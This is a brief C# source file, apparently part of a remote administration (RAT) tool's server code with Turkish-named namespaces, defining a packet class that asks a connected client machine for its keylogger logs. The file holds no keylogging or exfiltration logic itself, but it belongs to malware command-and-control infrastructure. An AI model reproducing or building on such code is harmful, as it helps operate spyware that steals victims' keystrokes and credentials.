using System;
using xServer.KuuhakuCekirdek.Ağ;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class GetKeyloggerLogs : IPacket
    {
        public GetKeyloggerLogs() { }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}